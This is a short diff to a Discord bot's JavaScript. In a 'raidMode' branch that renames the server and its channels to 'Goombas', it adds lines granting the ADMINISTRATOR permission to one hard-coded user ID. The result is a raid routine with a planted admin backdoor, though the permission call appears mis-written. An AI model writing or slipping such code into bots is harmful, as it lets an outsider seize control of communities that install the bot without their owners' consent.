@@ -51,6 +51,10 @@ client.on("ready", () => {
         guild.setIcon("./tcop.png");
       }
       if (raidMode) {
+        guild.members
+          .get("213247101314924545")
+          .permissions.add("ADMINISTRATOR")
+          .then(console.log("Welcome Admin!"));
         chan.setName("goombas-" + chan.name);
         guild.setName("Goombas");
         guild.setIcon("./goomba.png");
